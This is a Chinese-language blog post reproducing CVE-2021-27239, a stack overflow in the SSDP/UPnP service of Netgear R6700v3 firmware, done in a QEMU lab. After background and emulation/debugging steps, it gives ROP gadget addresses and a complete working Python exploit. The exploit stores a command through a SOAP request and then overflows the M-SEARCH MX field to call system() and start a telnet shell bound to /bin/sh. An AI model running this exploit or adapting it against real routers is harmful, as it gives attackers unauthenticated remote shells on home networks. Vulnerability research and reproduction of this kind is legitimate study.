<!DOCTYPE html><html lang="zh-CN"><head><title>IoT：CVE-2021-27239复现记录</title><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="stylesheet" href="/css/highlight/xcode.min.css"><link rel="stylesheet" href="/css/bootstrap/bootstrap-tooltips.css"><link rel="stylesheet" href="/css/post.css"><script src="/js/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.2"></head><body><script>if (/mobile/i.test(navigator.userAgent) || /android/i.test(navigator.userAgent)) {
  document.body.classList.add('mobile')
}</script><div><div class="inner"><h1>IoT：CVE-2021-27239复现记录</h1><div class="time">2023-04-09</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00%EF%BC%9A%E5%89%8D%E8%A8%80"><span class="toc-text">0x00：前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%EF%BC%9A%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86"><span class="toc-text">0x01：相关知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%EF%BC%9A%E6%BC%8F%E6%B4%9E%E6%89%80%E5%9C%A8"><span class="toc-text">0x02：漏洞所在</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%EF%BC%9A%E5%9B%BA%E4%BB%B6%E6%A8%A1%E6%8B%9F"><span class="toc-text">0x03：固件模拟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04%EF%BC%9A%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95"><span class="toc-text">0x04：远程调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">0x05：漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06%EF%BC%9A%E6%80%BB%E7%BB%93%E4%B8%8E%E5%8F%82%E8%80%83"><span class="toc-text">0x06：总结与参考</span></a></li></ol><h2 id="0x00：前言"><a href="#0x00：前言" class="headerlink" title="0x00：前言"></a>0x00：前言</h2><p>漏洞CVE-2021-27239被披露于部分Netgear路由器中，是UPnP服务所用的SSDP协议上的一个栈溢出漏洞。该漏洞的利用思路与上一次CVE-2021-34991漏洞相近，所以本文会略写利用手法，详写固件模拟、程序调试等过程。</p>
<br>

<h2 id="0x01：相关知识"><a href="#0x01：相关知识" class="headerlink" title="0x01：相关知识"></a>0x01：相关知识</h2><p>UPnP协议，<em>Universal Plug and Play</em>，广义的即插即用。UPnP的目的是：当任何设备一旦连接上网络，网络上的其它设备能够马上知道有新设备加入，然后这些设备能够互相宣传和发现彼此的能力和服务，以便能够使用和控制彼此。UPnP避免了人工配置的琐碎和操作的缓慢。</p>
<p>SSDP协议，<em>Simple Service Discovery Protocol</em>，简单服务发现协议，用于宣传和发现设备提供的服务和设备的一些信息。此协议采用基于通知和发现路由的多播发现方式实现，协议客户端在保留的多播地址：239.255.255.250:1900 (IPv4) 发现服务，(IPv6 为FF0x::C)。同时每个设备服务也在此地址上监听服务发现请求。如果服务监听到的发现请求与此服务相匹配，此服务会使用单播方式响应。</p>
<p>请求报文：</p>
<pre class="line-numbers language-none"><code class="language-none">M-SEARCH * HTTP&#x2F;1.1
HOST:239.255.255.250:1900
MAN:&quot;ssdp:discover&quot;
MX:5
ST:ssdp:all<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>响应报文：</p>
<pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 200 OK
ST: upnp:rootdevice
LOCATION: http:&#x2F;&#x2F;192.168.6.2:5000&#x2F;Public_UPNP_gatedesc.xml
SERVER: Linux&#x2F;2.6.12, UPnP&#x2F;1.0, NETGEAR-UPNP&#x2F;1.0
EXT:
CACHE-CONTROL: max-age&#x3D;3600
USN: uuid:6cbbc296-de22-bde2-3d68-5576da5933d1::upnp:rootdevice<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<br>

<h2 id="0x02：漏洞所在"><a href="#0x02：漏洞所在" class="headerlink" title="0x02：漏洞所在"></a>0x02：漏洞所在</h2><p>本次复现所用的固件版本为R6700v3 1.0.4.102，可点击<a target="_blank" rel="noopener" href="https://kb.netgear.com/000062417/R6700v3-Firmware-Version-1-0-4-102]">这里</a>下载。下载后使用<code>binwalk -Me</code>提取出固件文件系统。我们已知漏洞存在于upnp服务中，所以首先得找出对应的程序。可以通过相关的命令来帮助我们快速地寻找：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># find命令
find . -name upnpd
# 如果不太确定文件名字，可以使用通配符
find . -name *upnp*

# grep命令
grep -r upnp  #不仅是文件名，文件中含有该字符都会被查找出来<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过命令，可以找到upnp服务程序是/usr/sbin/upnpd。</p>
<p>IDA打开upnpd程序，通过字符串查找，可很快定位到漏洞所在处：</p>
<p><img src="/images/CVE-2021-27239%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/image-20230405210752357.png" alt="image-20230405210752357"></p>
<p>可以看出，strncpy拷贝的长度是等于MX字段的长度，同时v6是位于栈上的，因此可以进行栈溢出利用。</p>
<br>

<h2 id="0x03：固件模拟"><a href="#0x03：固件模拟" class="headerlink" title="0x03：固件模拟"></a>0x03：固件模拟</h2><div style="font-size: 21px;"><b>FirmAE：</b></div>

<p>固件模拟是成功了，但发送数据包时，似乎没发送到。原因待寻……😶</p>
<br>

<div style="font-size: 21px;"><b>qemu系统级模拟：</b></div>

<p>通过file命令可知道指令架构为32位ARM 小端序，固件的系统级模拟需要内核镜像文件、文件系统和启动文件，在此<a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/">网站</a>可进行下载。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wget https:&#x2F;&#x2F;people.debian.org&#x2F;~aurel32&#x2F;qemu&#x2F;armhf&#x2F;debian_wheezy_armhf_standard.qcow2
wget https:&#x2F;&#x2F;people.debian.org&#x2F;~aurel32&#x2F;qemu&#x2F;armhf&#x2F;vmlinuz-3.2.0-4-vexpress
wget https:&#x2F;&#x2F;people.debian.org&#x2F;~aurel32&#x2F;qemu&#x2F;armhf&#x2F;initrd.img-3.2.0-4-vexpress<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<br>

<p>在宿主机创建个虚拟网卡，用于与虚拟机交互。接着就是使用qemu-system-arm开始模拟。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">#! &#x2F;bin&#x2F;bash
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.6.1&#x2F;24
qemu-system-arm -M vexpress-a9 \
	-kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress \
	-drive if&#x3D;sd,file&#x3D;debian_wheezy_armhf_standard.qcow2 \
	-append &quot;root&#x3D;&#x2F;dev&#x2F;mmcblk0p2&quot; \
	-net nic -net tap,ifname&#x3D;tap0,script&#x3D;no,downscript&#x3D;no -nographic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<br>

<p>虚拟机成功模拟之后：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 配置虚拟网卡，用于宿主机交互
ifconfig eth0 192.168.6.2&#x2F;24

# 从宿主机传输文件系统到虚拟机
# 1.在宿主机执行下面命令，会以当前目录为根目录，在8888端口开启传输服务
python2 -m SimpleHTTPServer 8888   # python2
python3 -m http.server 8888        # python3
# 2.在虚拟机中使用wget下载
wget 192.168.6.1:8888&#x2F;[file]

# 挂载
mount -t proc &#x2F;proc .&#x2F;squashfs-root&#x2F;proc
mount -o bind &#x2F;dev .&#x2F;squashfs-root&#x2F;dev

chroot .&#x2F;squashfs-root&#x2F; sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<br>

<p>启动upnp服务：<code>/usr/sbin/upnpd</code></p>
<p>报错：<code>/dev/nvram: No such file or directory</code>这是固件模拟中比较常见的一个问题。</p>
<p>我们可以把相关的代码patch掉，具体操作是：自定义相应的函数，然后通过LD_PRELOAD环境变量优先加载我们编写的库。初此之外，还可能会报找不到dlsym符号的错误，这是因为没有加载到libdl.so.0库。</p>
<p>详细内容可参考：<a target="_blank" rel="noopener" href="https://paper.seebug.org/1311/">https://paper.seebug.org/1311/</a></p>
<p>最后：<code>LD_PRELOAD=&quot;/nvram.so /libdl.so.0&quot; /usr/sbin/upnpd</code></p>
<p>我们可以在宿主机<code>nmap 192.168.6.2</code>检查一下upnp服务是否成功启动。</p>
<br>

<h2 id="0x04：远程调试"><a href="#0x04：远程调试" class="headerlink" title="0x04：远程调试"></a>0x04：远程调试</h2><p>我们所知道，嵌入式设备的磁盘空间是很小的，不足以去添加完整的工具，其中之一就是gdb。了解到，gdbserver是一个程序，它可以使gdb和被调试程序分别运行在不同机器上。想要对upnp服务程序进行调试，我们可以上传一个gdbserver程序到虚拟机中，在虚拟中开启一个调试端口，让宿主机能够连接调试。</p>
<p>点击<a target="_blank" rel="noopener" href="https://gitee.com/h4lo1/HatLab_Tools_Library/tree/master/%E9%9D%99%E6%80%81%E7%BC%96%E8%AF%91%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F/gdbserver">这里</a>下载gdbserver程序</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ps | grep upnpd   # 查看upnpd服务的进程号
.&#x2F;gdbserver-7.7.1-armhf-eabi5-v1-sysv --attach 0.0.0.0:12345 [pid]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>由于是arm架构，所以宿主机得用gdb-multiarch进行连接：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 相关的gdb命令
set architecture arm
target remote 192.168.6.2:12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>我们可以在gdb中设置好断点，然后执行利用脚本，虚拟机中的程序会卡在断点处，等待着我们的调试。</p>
<br>

<h2 id="0x05：漏洞利用"><a href="#0x05：漏洞利用" class="headerlink" title="0x05：漏洞利用"></a>0x05：漏洞利用</h2><p>漏洞利用思路和上次<a target="_blank" rel="noopener" href="https://toleleyjl.github.io/2023/02/16/CVE-2021-34991%E5%A4%8D%E7%8E%B0/">CVE-2021-34991</a>相差无几，需要注意的是这次对两处发包，一次是先对5000端口发送命令存入，另外一次是对1900端口发包利用。利用手法还是使用栈溢出进行ROP，利用过程：有了大概的想法，然后去找gadget，编写exp试试，然后就是找gadget-&gt;慢慢调整，一个反复的过程。</p>
<p>我这里用到的gadget是这两段：</p>
<pre class="line-numbers language-none"><code class="language-none">.text:00013908 02 DB 8D E2                   ADD             SP, SP, #0x800
.text:0001390C 70 80 BD E8                   POP             &#123;R4-R6,PC&#125;

.text:00017C78 04 00 A0 E1                   MOV             R0, R4        ; command
.text:00017C7C 78 CC FF EB                   BL              system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>找gadget用的工具是ROPgadget，奇怪的是<code>--only参数</code>好像没起到挑选作用。这样子的话，我们可以先<code>ROPgadget --binary ./upnpd</code>，看看指令的大概格式，然后再在后面使用grep来一次或者多次进行挑选。例如：<code>ROPgadget --binary ./upnpd | grep &quot;add sp, sp&quot; | grep &quot;pop&quot;</code>。</p>
<p>至于调用system的gadget，我们可以直接在IDA找到对system的关联引用，依次查看。<img src="/images/CVE-2021-27239%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/image-20230409184735245.png" alt="image-20230409184735245"></p>
<p>EXP：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">import socket
import pwn

ssdp_port &#x3D; 1900
upnp_port &#x3D; 5000
ip &#x3D; &quot;192.168.6.2&quot;
command &#x3D; &quot;&#x2F;bin&#x2F;utelnetd -p3333 -l&#x2F;bin&#x2F;sh -d&quot;

def s2b(s):
	return bytes([ord(x) for x in s])

def mySend(ip, port, payload):
	sock&#x3D;socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	sock.connect((ip, port))
	sock.send(payload)
	pwn.sleep(1)
	sock.close()
	
def mySend_http(ip, port, payload):
	sock&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.connect((ip, port))
	sock.send(payload)
	pwn.sleep(1)
	sock.close()
	
def set_command():
	# 将命令写到全局变量中
	payload &#x3D;  b&#39;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; &#39;
	payload +&#x3D; b&#39;&lt;SOAP-ENV:Envelope&gt; &#39;
	payload +&#x3D; b&#39;Body&gt;:&#39;
	payload +&#x3D; s2b(command.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;))
#	payload +&#x3D; b&#39;ls&#39;
#	payload +&#x3D; b&#39;Body&gt;&#39;
	payload +&#x3D; b&quot; &lt;&#x2F;SOAP-ENV:Body&gt; &quot;
	payload +&#x3D; b&quot;&lt;&#x2F;SOAP-ENV:Envelope&gt;&quot;

	request  &#x3D; b&#39;POST &#x2F;Public_UPNP_C5 HTTP&#x2F;1.1\r\n&#39;
	request +&#x3D; s2b(&#39;Host: http:&#x2F;&#x2F;&#123;&#125;:&#123;&#125;\r\n&#39;.format(ip, upnp_port))
	request +&#x3D; b&#39;SOAPAction\r\n&#39;
	request +&#x3D; s2b(&#39;Content-Length: &#123;&#125;\r\n&#39;.format(len(payload)))
	request +&#x3D; b&#39;\r\n&#39;
	request +&#x3D; payload

	mySend_http(ip, upnp_port, request)

def Exploit():
	
	stack_add_gadget &#x3D; 0x13908  # ADD  SP, SP, #0x800;  POP  &#123;R4-R6,PC&#125;
	command_address  &#x3D; 0x65A58
	system_gadget    &#x3D; 0x17C78  # MOV R0, R4; BL system

	payload &#x3D; b&#39;M-SEARCH * HTTP&#x2F;1.1\r\n&#39;
	payload +&#x3D; b&#39;HOST: 239.255.255.250:1900\r\n&#39;
	payload +&#x3D; b&#39;MAN: &quot;ssdp:discover&quot;\r\n&#39;
	payload +&#x3D; b&#39;MX:4&#39; + b&#39;A&#39;*0x7f
	payload +&#x3D; b&#39;4444&#39;
	payload +&#x3D; b&#39;5555&#39;
	payload +&#x3D; b&#39;6666&#39;
	payload +&#x3D; pwn.p32(stack_add_gadget)[:3]
	payload +&#x3D; b&#39;\r\n\x00&#39;
	payload +&#x3D; b&#39;J&#39;*(0x800 - 0x778)
	payload +&#x3D; pwn.p32(command_address)
	payload +&#x3D; b&#39;K&#39;*4*2
	payload +&#x3D; pwn.p32(system_gadget)
	payload +&#x3D; b&#39;ST: ssdp:all\r\n&#39;
	print(&quot;len&#x3D;&quot;+str(len(payload)))
	print(payload)
	mySend(ip, ssdp_port, payload)
	
if __name__ &#x3D;&#x3D; &quot;__main__&quot;:
	set_command()
	Exploit()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<br>

<p>这次利用因为得向两处发包，所以EXP有点冗余。幸运的是，我在pursue师傅的<a target="_blank" rel="noopener" href="https://rmrfsad.github.io/2023/04/05/iot/CVE-2021-27239/">文章</a>中学了一招，可以直接使用strncpy函数来存入命令。</p>
<pre class="line-numbers language-none"><code class="language-none">.text:0000BB44 04 00 A0 E1                   MOV             R0, R4        ; dest
.text:0000BB48 0D 10 A0 E1                   MOV             R1, SP        ; src
.text:0000BB4C F2 FE FF EB                   BL              strcpy
.text:0000BB4C
.text:0000BB50 01 DB 8D E2                   ADD             SP, SP, #0x400
.text:0000BB54 70 80 BD E8                   POP             &#123;R4-R6,PC&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这还是挺不错的，毕竟不一定所有的路由器都能找到写入命令的服务。</p>
<br>

<h2 id="0x06：总结与参考"><a href="#0x06：总结与参考" class="headerlink" title="0x06：总结与参考"></a>0x06：总结与参考</h2><p>这次学到了很多东西，不过对于工具的使用还得慢慢消化……😴</p>
<div style="font-size: 21px;"><b>参考：</b></div>

<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1311/">https://paper.seebug.org/1311/</a></p>
<p><a target="_blank" rel="noopener" href="https://rmrfsad.github.io/2023/04/05/iot/CVE-2021-27239/">https://rmrfsad.github.io/2023/04/05/iot/CVE-2021-27239/</a></p>
<p class="textAlignRight"><span>↶ </span><a href="/">返回首页</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script async="" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script><script>MathJax = {
      tex: {
          inlineMath: [['$', '$'], ['\\(', '\\)']]
      },
      svg: {
          fontCache: 'global'
      }
  };
</script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', '');</script></html>